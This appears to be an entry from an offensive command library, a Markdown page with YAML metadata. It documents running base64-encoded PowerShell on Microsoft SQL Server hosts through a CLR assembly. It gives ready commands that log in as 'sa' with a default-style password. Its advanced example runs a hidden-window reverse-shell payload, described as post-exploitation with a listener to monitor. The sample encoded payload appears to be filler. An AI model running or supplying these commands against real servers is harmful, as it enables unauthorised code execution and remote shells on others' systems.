---
id: 8f76821e-0c8d-44a7-933d-83a495874f1b
name: invoke-clr-command-execution-powershell
type: command
executor: powershell
data: >-
  Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance
  "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
output: null
created_at: '2023-04-06T03:56:20.364546+00:00'
updated_at: '2023-04-10T20:36:39.601743+00:00'
platforms:
  - Windows
tags:
  - clr
  - mssql
  - powershell
  - payload
verified: true
validated: true
---

# invoke-clr-command-execution-powershell

## Command

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
```

## Description

This command uses a loaded CLR assembly to execute a base64-encoded PowerShell payload on the MSSQL host, enabling advanced post-exploitation like reverse shells. Replace <base64> with the encoded script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Username | SQL Server login (e.g., sa) | Yes |
| -Password | Plaintext password | Yes |
| -Instance | Full instance path (e.g., "DBSERVER\DBInstance") | Yes |
| -Command | Command string, here a PowerShell invocation with base64 payload | Yes |
| -Verbose | Show SQL traces and command output | No |

## Examples

### Basic Usage

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "SERVER\SQLEXPRESS" -Command "powershell -e JABzAD0ATgBUAEEAZwBlAHcALQBPAG8AbgBpAGUAbgBlAHMALABOAGUAdAAgAFMAVgBlAHIAcwAgAHIAbwBwAGkAcwAgAD0AIAAiAGMAIgAgACkAIAB7AA==" -Verbose
```

### Advanced Usage

```powershell
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -nop -w hidden -e <base64_reverse_shell>" -Verbose
```

## Expected Output

Displays deployment steps and payload execution result:

```
Assembly loaded successfully.
Procedure created.
PowerShell executed: [base64 decoded output or connection success]
No errors in SQL log.
```

If the payload connects back, monitor the listener; otherwise, errors may show in verbose output.

## Related

- [[procedures/mssql-clr-assembly-command-execution]]
- [[commands/invoke-clr-command-execution-whoami]]
